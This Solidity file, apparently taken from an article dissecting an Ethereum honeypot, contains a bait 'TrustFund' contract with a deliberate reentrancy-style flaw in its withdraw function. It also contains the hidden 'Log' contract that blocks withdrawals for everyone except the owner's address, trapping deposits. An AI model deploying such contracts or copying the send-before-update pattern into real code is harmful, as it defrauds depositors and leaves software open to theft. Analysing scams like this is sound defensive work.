// https://medium.com/coinmonks/dissecting-an-ethereum-honey-pot-7102d7def5e0

// ******************** The public source code ********************
pragma solidity ^0.4.19;

contract TrustFund {
  address owner;
  uint256 public minDeposit;
  mapping (address => uint256) balances;
  Logger public TrustLog;

  function TrustFund(uint256 _minDeposit, address _logger) public payable {
    owner = msg.sender;
    minDeposit = _minDeposit;
    TrustLog = Logger(_logger);
  }

  function deposit() public payable returns (bool) {
    if (msg.value > minDeposit) {
      balances[msg.sender]+=msg.value;
      TrustLog.LogTransfer(msg.sender,msg.value,"deposit");
    } else {
      TrustLog.LogTransfer(msg.sender,msg.value,"depositFailed");
    }
  }

  function withdraw(uint256 _amount) public {
    if(_amount <= balances[msg.sender]) {
      if(msg.sender.call.value(_amount)()) {
        balances[msg.sender] -= _amount;
        TrustLog.LogTransfer(msg.sender, _amount, "withdraw");
      } else {
        TrustLog.LogTransfer(msg.sender, _amount, "withdrawFailed");
      }
    }
  }

  function checkBalance(address _addr) public view returns (uint256) {
    return balances[_addr];
  }
}

contract Logger {
  struct Message {
    address sender;
    uint256 amount;
    string note;
  }

  Message[] History;
  Message public LastLine;

  function LogTransfer(address _sender, uint256 _amount, string _note) {
    LastLine.sender = _sender;
    LastLine.amount = _amount;
    LastLine.note = _note;
    History.push(LastLine);
  }
}


// ******************** The Trap ********************
pragma solidity ^0.4.19;

contract Log {
  address private owner;
  address private ethAddress;

  struct Message {
    address sender;
    uint256 amount;
    string note;
  }

  Message[] History;
  Message public LastLine;

  function Log() {
    owner = msg.sender;
    ethAddress = msg.sender;
  }

  function changeEthAddress(address _addr) {
    require(msg.sender == owner);
    ethAddress = _addr;
  }

  function LogTransfer(address _sender, uint256 _amount, string _note) {
    if (keccak256(_note) == keccak256("withdraw")) {
      require(_sender == ethAddress);
    }
    LastLine.sender = _sender;
    LastLine.amount = _amount;
    LastLine.note = _note;
    History.push(LastLine);
  }
}
